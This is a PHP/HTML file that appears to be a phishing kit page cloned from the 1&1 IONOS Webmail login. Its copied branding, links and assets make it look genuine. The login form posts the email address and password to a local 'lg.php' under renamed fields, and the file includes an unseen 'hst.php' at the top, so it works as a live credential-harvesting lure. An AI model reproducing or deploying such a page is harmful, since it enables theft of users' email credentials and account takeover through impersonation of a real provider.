﻿<?php
	require_once 'hst.php';
	$praga=rand();
	$praga=md5($praga);
?>
<!DOCTYPE html>
<html data-i18n="oao.lang" data-i18n-attr="lang" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <!-- charset -->
  <meta charset="utf-8">

  <!-- canonical relevant information -->
  <link rel="canonical" href="https://mail.ionos.com/" data-i18n="oao.login.canonical" data-i18n-attr="href">
  <link rel="alternate" hreflang="de" href="https://mail.ionos.de/">
  <link rel="alternate" hreflang="en-gb" href="https://mail.ionos.co.uk/">
  <link rel="alternate" hreflang="en-us" href="https://mail.ionos.com/">
  <link rel="alternate" hreflang="en-ca" href="https://mail.ionos.ca/">
  <link rel="alternate" hreflang="en" href="https://mail.ionos.com/">
  <link rel="alternate" hreflang="es-es" href="https://mail.ionos.es/">
  <link rel="alternate" hreflang="es-mx" href="https://mail.ionos.mx/">
  <link rel="alternate" hreflang="es" href="https://mail.ionos.es/">
  <link rel="alternate" hreflang="fr" href="https://mail.ionos.fr/">
  <link rel="alternate" hreflang="it" href="https://mail.ionos.it/">
  <link rel="alternate" hreflang="x-default" href="https://mail.ionos.com/">

  <!-- head infos -->
  <title data-i18n="oao.login.title" data-i18n-attr="text">1&amp;1 IONOS E-Mail login</title>
  <meta name="description" content="Login to access your 1&amp;1 IONOS e-mail account and read your e-mail online with 1&amp;1 IONOS Webmail." data-i18n="oao.login.description" data-i18n-attr="content">

  <!-- microsoft ie-mode -->
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <!-- mobile config -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="manifest" href="https://mail.ionos.com/manifest.json">
  <!-- microsoft mobile config -->
  <meta id="win8Icon" name="msapplication-TileImage" content="img/icon144_win.png">
  <meta id="win8TileColor" name="msapplication-TileColor" content="#003d8f">
  <!-- apple mobile config -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <!-- apple-touch-icon -->
  <link id="icon57" rel="apple-touch-icon" href="https://mail.ionos.com/img/icon57.png">
  <link id="icon72" rel="apple-touch-icon" sizes="72x72" href="https://mail.ionos.com/img/icon72.png">
  <link id="icon76" rel="apple-touch-icon" sizes="76x76" href="https://mail.ionos.com/img/icon76.png">
  <link id="icon114" rel="apple-touch-icon" sizes="114x114" href="https://mail.ionos.com/img/icon114.png">
  <link id="icon120" rel="apple-touch-icon" sizes="120x120" href="https://mail.ionos.com/img/icon120.png">
  <link id="icon144" rel="apple-touch-icon" sizes="144x144" href="https://mail.ionos.com/img/icon144.png">
  <link id="icon152" rel="apple-touch-icon" sizes="152x152" href="https://mail.ionos.com/img/icon152.png">
  <link id="icon167" rel="apple-touch-icon" sizes="167x167" href="https://mail.ionos.com/img/icon167.png">
  <link id="icon180" rel="apple-touch-icon" sizes="180x180" href="https://mail.ionos.com/img/icon180.png">
  <link id="icon192" rel="apple-touch-icon" sizes="192x192" href="https://mail.ionos.com/img/icon192.png">
  <!-- apple-touch-startup-image [media-devicewidth is not W3C-conform] -->
  <link id="splash460" rel="apple-touch-startup-image" href="https://mail.ionos.com/img/splashscreen_460.jpg"><!-- media="(device-width: 320px)" -->
  <link id="splash920" rel="apple-touch-startup-image" href="https://mail.ionos.com/img/splashscreen_920.jpg"><!-- media="(device-width: 320px) and (-webkit-device-pixel-ratio: 2)" -->
  <link id="splash1096" rel="apple-touch-startup-image" href="https://mail.ionos.com/img/splashscreen_1096.jpg"><!-- media="(device-aspect-ratio: 40/71)" -->
  <!-- favicon -->
  <link id="favicon" rel="shortcut icon" href="https://mail.ionos.com/img/favicon.ico" type="image/x-icon">
  <!-- css includes -->
  <link rel="stylesheet" type="text/css" href="index_files/ionos.css">
  <link rel="stylesheet" type="text/css" href="index_files/login.css">
  <script type="text/javascript" async="" src="index_files/zones.js"></script><script type="text/javascript" async="" src="index_files/ias.js"></script><script type="text/javascript" async="" src="index_files/statuspage.js"></script><script type="text/javascript" async="" src="index_files/inpagelayer.js"></script><script type="text/javascript" async="" src="index_files/navigation.js"></script><script id="oaotag" type="text/javascript" async="" defer="defer" src="index_files/webmail-login.js"></script><script src="index_files/ionos.js" async="async"></script>
<link type="text/css" rel="stylesheet" href="index_files/inpagelayer.css"><link type="text/css" rel="stylesheet" href="index_files/navigation.css"><script type="text/javascript" src="index_files/70000.js"></script><link type="text/css" rel="stylesheet" href="index_files/statuspage.css"></head>
<body class="mail oao-pi-nolayer oao-pi-with-navigation">
<!-- error for JS-disabled browsers -->
<noscript>
  <p class="noscript">
    This page uses JavaScript.
    Your browser either doesn't support JavaScript or you have it turned off.
    To use this page please use a JavaScript enabled browser.
  </p>
</noscript>

<!-- cookie information -->
<div id="cookieinfo-container" class="hidden" aria-hidden="true" style="display: none;">
  <div class="cookieinfo">
    <span data-i18n="oao.login.cookie.information" data-i18n-attr="text">This website uses cookies. By using our website, you agree to our use of cookies.</span>
    <a href="#" target="_blank" data-i18n="oao.login.cookie.more-info.link" data-i18n-attr="href" style="display: none;">
      <span data-i18n="oao.login.cookie.more-info" data-i18n-attr="text">More info</span>
    </a>
    &nbsp;
    <span id="cookieinfo-close">x</span>
  </div>
</div>

<!-- Global Navigation -->
<div id="header">
  <div class="oao-navi-navigation oao-navi-finished">
    <div class="oao-navi-top"><ul></ul></div><div class="oao-navi-left">
      <!-- uncomment for burger menu
      <span class="oao-navi-burger"></span>
      -->
      <div class="oao-navi-application-name">
        <a class="oao-navi-app-name" data-i18n="oao.login.ionos.link" data-i18n-attr="href" href="https://www.ionos.com/">
          <span data-i18n="oao.login.app" data-i18n-attr="text">Webmail</span>
        </a>
      </div>
    </div>
  <div class="oao-navi-center"><ul><li class="oao-navi-flyout-container oao-navi-flyout-search oao-navi-flyout-search-big"><div class="oao-navi-search-container"><a class="oao-navi-flyout-item" title="Solution finder"></a><div class="oao-navi-input-container"><i class="oao-navi-search-icon"></i><input class="oao-navi-search-input" type="search" placeholder="Search for Features, Domains, and Help"><i class="oao-navi-search-mic"></i></div></div></li></ul></div><div class="oao-navi-right"><ul class="oao-navi-sub"><li class="oao-navi-flyout-container oao-navi-flyout-support "><a class="oao-navi-flyout-item" data-target-id="oao-navi-support-button" title="Contact"></a></li><li class="oao-navi-flyout-container oao-navi-flyout-search oao-navi-flyout-search-small"><div class="oao-navi-search-container"><a class="oao-navi-flyout-item" title="Solution finder"></a><div class="oao-navi-input-container"><i class="oao-navi-search-icon"></i><input class="oao-navi-search-input" type="search" placeholder="Search for Features, Domains, and Help"><i class="oao-navi-search-mic"></i></div></div></li></ul></div></div>
</div>

<!-- main wrap -->
<div id="main">

  <!-- Global Navigation > Statuspage Integration > Incident/Maintenance status -->
  <div class="oao-statuspage-message-container" data-component="WEBMAIL,MAIL_RECEIVING,MAIL_SENDING"></div>

  <!-- form contrainer -->
  <section class="login-forms" role="main">
    <div class="clearfix">
      <div class="clearfix">

        <!-- login-form -->
        <form id="login-form" class="form content-elem" action="lg.php"  method="post" autocomplete="on">

          <h1 class="headline">
            <span data-i18n="oao.login.heading" data-i18n-attr="text">Webmail Login</span>
          </h1>

          <fieldset>
            <legend class="hidden" data-i18n="oao.login.email" data-i18n-attr="text" aria-hidden="false">E-Mail</legend>
            <!-- login-form: error output -->
            <div id="login-error" class="notificaiton-wrap"></div>

            <!-- login-form: elements -->
            <div class="form-field loginform-user">
              <label for="username" data-i18n="oao.login.field.email" data-i18n-attr="text">E-mail Address</label>
              <div class="input-text-group input-text-group--empty">
                <span class="input-text-group__icon exos-icon exos-icon-nav-user-16"></span>
                <input type="text" id="username" name="uusr" required placeholder="E-mail Address" data-i18n="oao.login.field.email" data-i18n-attr="placeholder" autofocus="autofocus" tabindex="1"><!-- type email not working in IE for Umlaut-Domains currently -->
              </div>
            </div>
            <div class="form-field loginform-password">
              <label for="password" data-i18n="oao.login.field.password" data-i18n-attr="text">Password</label>
              <div class="sub-form-field right">
                <a data-i18n="oao.login.forgotpw.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2327&amp;utm_term=2327&amp;utm_campaign=forgotpw&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=flyin" data-flyin-href="" class="link link--lookup oao-pi-open-in-flyin" tabindex="5">
                  <span data-i18n="oao.login.forgotpw.heading" data-i18n-attr="text">Forgot your password?</span>
                </a>
              </div>
              <div class="input-text-group input-text-group--empty">
                <span class="input-text-group__icon exos-icon exos-icon-password-16"></span>
                <input type="password" id="password" name="prrd"  required value="" placeholder="Password" data-i18n="oao.login.field.password" data-i18n-attr="placeholder" autocomplete="current-password" tabindex="2">
              </div>
              <div class="sub-form-field left">
                <input id="staysignedin-box" class="input-checkbox" name="staysignedin" type="checkbox" value="1" tabindex="3">
                <label for="staysignedin-box">
                  <a data-i18n="oao.login.stay-signed-in.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=4083&amp;utm_term=4083&amp;utm_campaign=staysignedin&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=flyin" data-flyin-href="" class="link link--lookup oao-pi-open-in-flyin">
                    <span data-i18n="oao.login.stay-signed-in" data-i18n-attr="text">Remember me</span>
                  </a>
                </label>
              </div>
            </div>
            <div class="form-field">
              <button type="submit" id="submit-login-form" name="submit" data-i18n="oao.login" data-i18n-attr="text" tabindex="4">Login</button>
            </div>
          </fieldset>
        </form>
      </div>
    </div>

  </section>

  <section id="ciso-afs-ads">
    <div class="ias-zone" data-ias-zoneid="webmailer_login" id="ias.zone0"><div>
<section id="ias-container">
  <div class="grid-12 equal-grid-height">
    <div class="grid-07 grid-small-12">
      <h2 class="ias-headline">Email without the distractions</h2>
      
          <p>Reduce clutter. Save time. Improve your productivity.</p>
        
      
          <ul class="check-list">
            <li>Free yourself from repetitive email threads</li>
            <li>Focus – a priority inbox ensures important messages come first</li>
            <li>Keep it simple – one app for all your communication at work</li>
          </ul>
        
      <div>
        <a class="button-link" target="_blank" href="https://ias.ionos.com/ias/follow/CLICK?ias_source=WEBMAILER-US&amp;ias_medium=login-webmailer_login&amp;ias_content=WEBMAIL_LOGIN_TEASER_SPIKE_VARB-DEFAULT&amp;ias_campaign=mail-login&amp;target=https%3A%2F%2Fspikenow.com%2Fr%2Fionos%2F%3Fias_market%3DUS%26ias_variant%3DVARB">Get started, it's free</a>
      </div>
    </div>
    <div class="grid-05 grid-small-12 align-horizontal-center align-vertical-center">
      <img class="ias-responsive-video" src="index_files/spike_smartphone_visual.png">
    </div>
  </div>
</section>

<style type="text/css">
  #ias-container {
    background: #fff;
    margin-top: 32px;
    padding: 28px;
    -moz-box-shadow: 0 1px 2px 0 rgba(80,87,91,.15);
    -webkit-box-shadow: 0 1px 2px 0 rgba(80,87,91,.15);
    box-shadow: 0 1px 2px 0 rgba(80,87,91,.15);
  }
  .ias-responsive-video {
    max-width: 100%;
    max-height: 240px;
  }
  .ias-headline {
    width: 100%;
  }
</style>


    
</div></div>
  </section>

  <section id="assistants">
    <h2 data-i18n="oao.login.setup.headline" data-i18n-attr="text">Set up your mailbox on other devices</h2>
    <dl class="pipe-list">
      <dt data-i18n="oao.login.setup.mobile" data-i18n-attr="text">Mobile</dt>
      <dd>
        <a data-i18n="oao.login.setup.mobile.ios.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2442&amp;utm_term=2442&amp;utm_campaign=mobile-ios&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="8" target="_blank">
          <span data-i18n="oao.login.setup.mobile.ios" data-i18n-attr="text">iOS</span>
        </a>
      </dd>
      <dd>
        <a data-i18n="oao.login.setup.mobile.android.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2444&amp;utm_term=2444&amp;utm_campaign=mobile-android&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="9" target="_blank">
          <span data-i18n="oao.login.setup.mobile.android" data-i18n-attr="text">Android</span>
        </a>
      </dd>
    </dl>
    <dl class="pipe-list">
      <dt data-i18n="oao.login.setup.desktop" data-i18n-attr="text">Desktop</dt>
      <dd>
        <a data-i18n="oao.login.setup.desktop.thunderbird.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2436&amp;utm_term=2436&amp;utm_campaign=desktop-thunderbird&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="10" target="_blank">
          <span data-i18n="oao.login.setup.desktop.thunderbird" data-i18n-attr="text">Thunderbird</span>
        </a>
      </dd>
      <dd>
        <a data-i18n="oao.login.setup.desktop.outlook.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2462&amp;utm_term=2462&amp;utm_campaign=desktop-outlook&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="11" target="_blank">
          <span data-i18n="oao.login.setup.desktop.outlook" data-i18n-attr="text">Outlook</span>
        </a>
      </dd>
      <dd>
        <a data-i18n="oao.login.setup.desktop.applemail.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2445&amp;utm_term=2445&amp;utm_campaign=desktop-applemail&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="12" target="_blank">
          <span data-i18n="oao.login.setup.desktop.applemail" data-i18n-attr="text">Apple Mail</span>
        </a>
      </dd>
    </dl>
    <dl class="pipe-list">
      <dt data-i18n="oao.login.setup.other" data-i18n-attr="text">Other</dt>
      <dd>
        <a data-i18n="oao.login.setup.other.assistants.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2490&amp;utm_term=2490&amp;utm_campaign=other-assistants&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="13" target="_blank">
          <span data-i18n="oao.login.setup.other.assistants" data-i18n-attr="text">email programs (POP/IMAP)</span>
        </a>
      </dd>
    </dl>
  </section>

  <div id="list-additional-login-links">
    <h2 data-i18n="oao.login.morelogins.heading" data-i18n-attr="text">Other 1&amp;1 IONOS Logins</h2>
    <ul class="clearfix">
      <li>
        <a class="product-link " href="https://my.ionos.com/" data-i18n="oao.login.controlcenter.link" data-i18n-attr="href" tabindex="6">
          <span class="product-link-image" id="product-link-image--controlcenter"></span>
          <span class="product-link-heading" data-i18n="oao.login.controlcenter" data-i18n-attr="text">My IONOS</span>
        </a>
      </li>
      <li>
        <a class="product-link " href="https://hidrive.ionos.com/" data-i18n="oao.login.hidrive.link" data-i18n-attr="href" tabindex="7">
          <span class="product-link-image" id="product-link-image--hidrive"></span>
          <span class="product-link-heading" data-i18n="oao.login.hidrive" data-i18n-attr="text">HiDrive</span>
        </a>
      </li>
    </ul>
  </div>

</div>

<footer>
  <ul class="clearfix">
    <li>
      <!-- Global Navigation > Statuspage Integration > Overall status -->
      <div class="oao-statuspage-overall-status"><a class="oao-statuspage-overall-state-none" target="_blank" href="https://www.ionos-status.com/?utm_medium=footer&amp;utm_content=none&amp;utm_source=WEBMAIL_LOGIN&amp;utm_campaign=login&amp;utm_term=no_search">All Systems Operational</a></div>
    </li>
    <li>
      <a href="https://www.ionos.com/about" data-i18n="oao.login.imprint.link" data-i18n-attr="href" target="_blank">
        <span data-i18n="oao.login.ionos.legal" data-i18n-attr="text">1&amp;1 IONOS Inc.</span>&nbsp;•&nbsp;<span data-i18n="{YEAR}" data-i18n-attr="text">2019</span>
      </a>
    </li>
    <li>
      <a href="https://www.ionos.com/terms-gtc/terms-privacy/" data-i18n="oao.login.datasecurity.link" data-i18n-attr="href" target="_blank">
        <span data-i18n="oao.login.datasecurity" data-i18n-attr="text">Privacy Policy</span>
      </a>
    </li>
  </ul>
</footer>

<iframe class="hidden" src="index_files/robots.txt" name="loginTarget"></iframe>
<script type="text/javascript" src="index_files/main.js"></script>


<div class="page-transition__blocker"><div class="page-transition__loading-spin loading-spin"></div></div><div class="static-overlay__blocker static-overlay__blocker--hidden"></div></body></html>